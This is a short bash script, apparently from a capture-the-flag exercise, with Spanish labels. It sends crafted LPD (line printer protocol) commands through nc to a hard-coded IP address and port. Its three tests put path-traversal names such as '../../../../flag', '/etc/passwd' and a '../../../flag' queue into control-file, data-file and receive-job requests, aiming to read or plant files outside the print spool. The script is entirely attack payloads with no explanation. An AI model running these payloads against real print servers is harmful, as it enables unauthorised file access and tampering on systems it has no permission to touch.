#!/bin/bash
TARGET="94.237.49.23"
PORT="37326"

echo "=== Test 1: Control file con path traversal en nombre ==="
{
    printf "\x02lp\n"
    sleep 0.2
    CONTROL="Htest\nUroot\nfdfA001localhost\n"
    SIZE=${#CONTROL}
    printf "\x02%d cfA001../../../../flag\n%s\x00" "$SIZE" "$CONTROL"
} | timeout 5s nc $TARGET $PORT | xxd
echo -e "\n---"

echo "=== Test 2: Data file con path en nombre ==="
{
    printf "\x02lp\n"
    sleep 0.2
    DATA="test"
    DSIZE=${#DATA}
    printf "\x03%d /etc/passwd\n%s\x00" "$DSIZE" "$DATA"
} | timeout 5s nc $TARGET $PORT | xxd
echo -e "\n---"

echo "=== Test 3: Receive job con cola maliciosa ==="
printf "\x02../../../flag\n" | timeout 5s nc $TARGET $PORT | xxd
echo -e "\n---"